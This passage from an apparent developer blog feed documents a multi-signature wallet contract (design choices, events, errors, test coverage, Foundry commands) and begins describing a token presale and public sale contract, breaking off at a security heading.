&lt;h2 id=&quot;multi-signature-wallet&quot;&gt;&lt;strong&gt;Multi Signature Wallet&lt;&#x2F;strong&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;A multi-signature (multisig) wallet is a smart contract that requires multiple private keys to authorize and execute a transaction. This provides an additional layer of security compared to traditional single-signature wallets, where only one private key is needed. Multisig wallets are commonly used in various decentralized applications, including cryptocurrency platforms and decentralized autonomous organizations (DAOs).&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;features&quot;&gt;Features&lt;&#x2F;h3&gt;
&lt;p&gt;This multi-sig contract has the following features:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The contract allows multiple owners to collectively control the funds in the wallet.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Wallet has multiple owners, each having their own private key.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;A specified number of owners (threshold) is required to approve and execute a transaction.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Owners can submit, approve, and cancel transactions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;design-choices&quot;&gt;Design Choices&lt;&#x2F;h3&gt;
&lt;p&gt;I have designed this MultiSig contract with the following functionalities with my design choices to make this efficient.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Structs for Transactions&lt;&#x2F;strong&gt; : This choice makes it easy to manage and organize transaction data. The struct encapsulates the details of each transaction, including the owner initiating it, whether it has been executed, the recipient address, value, and data.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Approval Status&lt;&#x2F;strong&gt; : Used a mapping to track approval status for each transaction. Storing approval status in a mapping (&lt;code&gt;isApproved&lt;&#x2F;code&gt;) allows for efficient lookup and management of transaction approvals. It helps in quickly determining whether an owner has already approved a specific transaction.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Several Modifiers&lt;&#x2F;strong&gt;: Implemented modifiers like &lt;code&gt;validTxId&lt;&#x2F;code&gt;, &lt;code&gt;onlyOwner&lt;&#x2F;code&gt;, &lt;code&gt;hasToExecuted&lt;&#x2F;code&gt;, and &lt;code&gt;hasToApproved&lt;&#x2F;code&gt; for access control. Modifiers help in code reusability and readability. They enforce certain conditions before executing a function, making the code more secure and preventing unauthorized access.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ThreshHold&lt;&#x2F;strong&gt; :  Used a &lt;code&gt;threshold&lt;&#x2F;code&gt; value to determine when a transaction is considered confirmed. The contract requires a minimum number of owner approvals (&lt;code&gt;threshHold&lt;&#x2F;code&gt;) to execute a transaction.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Revoking Approve&lt;&#x2F;strong&gt;: Implemented a &lt;code&gt;revokeApprove&lt;&#x2F;code&gt; function. Allowing owners to revoke their approvals provides additional control and flexibility. If an owner changes their mind before a transaction is executed, they can revoke their approval, preventing the transaction from going through.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Cancellation of Tx&lt;&#x2F;strong&gt; : Implemented a &lt;code&gt;cancelTx&lt;&#x2F;code&gt; function. Owners have the ability to cancel transactions they initiated, providing a way to clean up the transaction list and prevent the execution of unwanted transactions. I have implemented this &lt;code&gt;cancelTx&lt;&#x2F;code&gt; function in such a way that it can only be callable by the transaction owner. i.e, who submits that transaction.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Many Events&lt;&#x2F;strong&gt; : Events are emitted to provide transparency and allow external systems to react to state changes.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; Events
&lt;&#x2F;span&gt;&lt;span&gt;event MultiSig_Transaction_Submit(uint indexed txId, address indexed from, address _to, uint value, bytes data);
&lt;&#x2F;span&gt;&lt;span&gt;event MultiSig_Transaction_Approved(uint indexed _txId, address indexed _owner);
&lt;&#x2F;span&gt;&lt;span&gt;event MultiSig_Transaction_Executed(uint indexed _txId);
&lt;&#x2F;span&gt;&lt;span&gt;event MultiSig_EthDeposited(address indexed sender, uint indexed value);
&lt;&#x2F;span&gt;&lt;span&gt;event MultiSig_Approve_Revoked(address indexed _owner, uint indexed _txId);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Custom Errors&lt;&#x2F;strong&gt; : I have used custom error types to be more specific to the user when they encounter any error.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; Errors
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Not_Enough_Owners();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Invalid_ThreshHold_Specified();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Invalid_Owner();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Not_Owner();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Invalid_To();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Invalid_TransactionID();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Tx_Already_Approved();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Tx_Already_Executed();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Transaction_Not_Yet_Confirmed();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Transaction_Failed();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Tx_Not_Approved();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Not_Tx_Owner();
&lt;&#x2F;span&gt;&lt;span&gt;error MultiSig_Insufficient_Wallet_Balance();
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Added a receive function&lt;&#x2F;strong&gt; : To be able to receive deposited ether to the wallet. Upon receiving ether the Wallet will emit Deposit event.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;&#x2F;h3&gt;
&lt;p&gt;I have taken some important security considerations in the &lt;code&gt;MultiSig&lt;&#x2F;code&gt; contract which handles many edge cases and eliminates vulnerabilities in the contract.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Access COntrol&lt;&#x2F;strong&gt; : Access to the functions were handled by modifiers, for example : Submitting a transaction can only possible for a owner. This check done my &lt;code&gt;onlyOwner()&lt;&#x2F;code&gt; modifier.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Transaction State Checks&lt;&#x2F;strong&gt; : Modifiers like executed and approved prevent actions such as double approvals or double executions of transactions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Constructor validation&lt;&#x2F;strong&gt; : The owners specified in constructor were checked again duplicate owner addresses and zero addresses. The threshold is ensured to less than total number of owners and atleast 2.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Custom Errors&lt;&#x2F;strong&gt; : Custom errors provide informative feedback and help save gas compared to traditional require statements with error messages.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Event Emission&lt;&#x2F;strong&gt; : The contract emits events for significant actions like transaction submission, approval, execution, and fund deposits.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Cancelling Transaction&lt;&#x2F;strong&gt; : The cancellation of transaction can only done before the transaction executes and only by the owner who submits that transaction.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Executing Transaction&lt;&#x2F;strong&gt; : The transaction can only executed by a owner when the transaction get enough approvals (threshold). The transaction existence is checked by &lt;code&gt;validTxId&lt;&#x2F;code&gt; modifier.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Low level call handle&lt;&#x2F;strong&gt; : The low level call is used to send the valut to the address. This &lt;code&gt;call&lt;&#x2F;code&gt; is handled properly by ensuring its return value. And the &lt;code&gt;checks-effect-interactions&lt;&#x2F;code&gt; is followed to mitigate &lt;code&gt;Reentrancy&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;test-cases&quot;&gt;Test Cases&lt;&#x2F;h3&gt;
&lt;p&gt;I have implemented near 100% test coverage for the MultiSig contract. Which ensures following test cases.&lt;&#x2F;p&gt;
&lt;p&gt;Here&#x27;s an outline of the test cases we will cover:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Test the contract initialization and owner settings.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test submitting a transaction by an owner.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test approving a transaction by an owner.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test approving a transaction reverts if already approved.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test executing a transaction after reaching the threshold.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test executing a transaction reverts if not enough approvals.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test revoking an approval.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test revoking an approval reverts if not previously approved.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test transaction execution reverts if it&#x27;s already executed.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Test canceling a transaction by its owner.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;And even more...&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge coverage
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Running&lt;&#x2F;span&gt;&lt;span&gt; tests...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File                  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; Lines         &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; Statements    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; Branches     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; Funcs       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-----------------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-----------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-----------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;----------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;---------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;script&#x2F;MultiSig.s.sol &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (9&#x2F;9)   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (10&#x2F;10) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (0&#x2F;0)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (1&#x2F;1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&#x2F;MultiSig.sol      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (24&#x2F;24) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;97.06%&lt;&#x2F;span&gt;&lt;span&gt; (33&#x2F;34)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;92.86%&lt;&#x2F;span&gt;&lt;span&gt; (13&#x2F;14) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (6&#x2F;6) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Total                 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (33&#x2F;33) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;97.73%&lt;&#x2F;span&gt;&lt;span&gt; (43&#x2F;44)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;92.86%&lt;&#x2F;span&gt;&lt;span&gt; (13&#x2F;14) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;100.00%&lt;&#x2F;span&gt;&lt;span&gt; (7&#x2F;7) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;build&quot;&gt;Build&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge build
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;test&quot;&gt;Test&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge test
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;format&quot;&gt;Format&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge fmt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gas-snapshots&quot;&gt;Gas Snapshots&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge snapshot
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;anvil&quot;&gt;Anvil&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ anvil
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;deploy&quot;&gt;Deploy&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge script script&#x2F;MultiSig.s.sol:MultiSigScript --rpc-url &amp;lt;your_rpc_url&amp;gt; --private-key &amp;lt;your_private_key&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Token Sale</title>
        <published>2024-01-23T00:00:00+00:00</published>
        <updated>2024-01-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/tokensaleproject/"/>
        <id>https://themj0ln1r.github.io/projects/tokensaleproject/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/tokensaleproject/">&lt;p&gt;A simple Token Pre Sale and Public Sale Project developed by me for an internship task.&lt;&#x2F;p&gt;
&lt;p&gt;Project Repo :  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;Token-Sale-Project&quot; target=_blank&gt;Token Sale Project&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;token-pre-sale-public-sale&quot;&gt;&lt;strong&gt;Token Pre-Sale &amp;amp; Public Sale&lt;&#x2F;strong&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Token Sale is a fundraising mechanism used by blockchain projects to distribute and sell their native tokens to the public.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;features&quot;&gt;Features&lt;&#x2F;h3&gt;
&lt;p&gt;This Token sale project has the following features :&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Presale:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Users can contribute Ether to the presale and receive project tokens in return.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The presale has a maximum cap on the total Ether that can be raised.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The presale has a minimum and maximum contribution limit per participant.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Tokens are distributed immediately upon contribution.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Public Sale:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;After the presale ends, the public sale begins.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Users can contribute Ether to the public sale and receive project tokens in return.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The public sale has a maximum cap on the total Ether that can be raised.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The public sale has a minimum and maximum contribution limit per participant.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Tokens are distributed immediately upon contribution.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Token Distribution:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The smart contract should have a function to distribute project tokens to a specified address. This function can only be called by the owner of the contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Refund:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If the minimum cap for either the presale or public sale is not reached, contributors should be able to claim a refund.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Emergency Withdraw:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If there was any emergency situation that owner has to withdraw all the funds from contract. This can be done with the Emergency withdraw function.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;design-choices&quot;&gt;Design Choices&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Inheritance and Libraries:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The contract inherits from the &lt;code&gt;Ownable&lt;&#x2F;code&gt;, &lt;code&gt;SafeERC20&lt;&#x2F;code&gt; contracts, which are part of the OpenZeppelin library. This ensures that only the owner of the contract has certain privileges and safely interact with ERC-20 tokens.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;State Variables:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The contract has various state variables to manage the token sale parameters, such as minimum and maximum caps for both presale and public sale, contribution limits, durations, start times, and amounts raised.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Separate variables are used to track contributions for presale and public sale, and mappings are used to associate contributions with specific addresses.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Events:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The contract emits events to log important changes and actions, making it easier for external systems to track and respond to contract events.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Modifiers:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Modifiers are used to ensure that certain conditions are met before executing functions. For example, isValidCapacities ensures that the minimum and maximum values are valid, and isValidDuration ensures that the sale duration is greater than zero.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Constructor:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The constructor initializes the contract with the address of the ERC-20 token being sold. If the provided token address is zero, an error is triggered.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Presale and Public Sale Functions:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Separate functions are implemented to start the presale and public sale, each with parameters such as maximum and minimum caps, duration, and contribution limits. These functions can only be called by the owner.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The functions perform checks to ensure that the presale and public sale are not already active, and that the presale has occurred before starting the public sale.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Token Purchase Functions:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Functions like buyTokensInPresale and buyTokensInPublicsale allow participants to buy tokens during the presale and public sale, respectively. Checks are in place to ensure the sale is active, contribution limits are adhered to, and the minimum and maximum caps are not exceeded.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Refund Function:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The claimRefund function allows participants to claim a refund if the minimum cap for the presale or public sale is not reached. Refunds are only possible after the respective sale has ended.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Secure Value Transfer:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The contract includes a secure internal function (sendValue) to transfer Ether to an address. It checks the contract&#x27;s balance and ensures that the transfer is successful.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Setters and Getters:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Various setter functions allow the owner to change parameters such as capacities, durations, and contribution limits. Getter functions are provided to check the status of the presale and public sale.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Emergency Withdraw Function:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;An emergency withdrawal function (withdraw) is implemented, allowing the owner to withdraw any remaining tokens and Ether from the contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Fallback Function:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The contract includes a fallback function that emits an event when it receives Ether when an unexpected ether was sennt to this contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;&#x2F;h3&gt;
